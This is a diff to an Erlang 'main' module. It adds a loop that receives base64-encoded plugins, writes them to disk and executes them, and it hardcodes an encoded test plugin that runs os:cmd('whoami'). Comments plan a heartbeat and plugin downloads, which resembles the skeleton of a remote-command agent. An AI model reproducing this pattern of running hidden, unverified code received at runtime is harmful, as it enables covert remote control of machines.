@@ -1,5 +1,9 @@
 -module(main).
--export([start/0]).
+-export([start/0,loop/0]).
+
+savePlugin(FileName, FileContent) ->
+    file:write_file(filename:flatten(["./plugins/",FileName,".erl"]),base64:decode(FileContent)),
+    filename:flatten(["./plugins/",FileName,".erl"]).
 
 run_commands(CMDS) ->
     run_commands(CMDS, []).
@@ -23,9 +27,21 @@ run_commands([],Results) ->
     lists:reverse(Results).
 
 start() ->
-    run_commands(['../plugins/test.erl']).
+    FileName = savePlugin("test","LW1vZHVsZSh0ZXN0KS4KLWV4cG9ydChbc3RhcnQvMCxnZXRfcmVzdWx0LzBdKS4KLW9uX2xvYWQoc3RhcnQvMCkuCgpzdGFydCgpIC0+CiAgICBpbzpmb3JtYXQoIkhJIEZST00gVEVTVCBQTFVHSU5+biIpLgoKZ2V0X3Jlc3VsdCgpIC0+CiAgICBpbzpmb3JtYXQoIlJ1bm5pbmcgY29kZX5uIiksCiAgICBvczpjbWQoIndob2FtaSIpLgo="),
+    io:format("Saved ~p~n",[FileName]),
+    run_commands([FileName]).
 
 % loop with
 % heartbeat
 % download plugins to temp files and save file names
 % run commands
+
+loop() ->
+    receive 
+	{plugin,PluginName,PluginContentBase64} -> 
+	    run_commands([savePlugin(PluginName, PluginContentBase64)]),
+	    loop()
+    after 10 ->
+	    loop()
+    end.
+				     
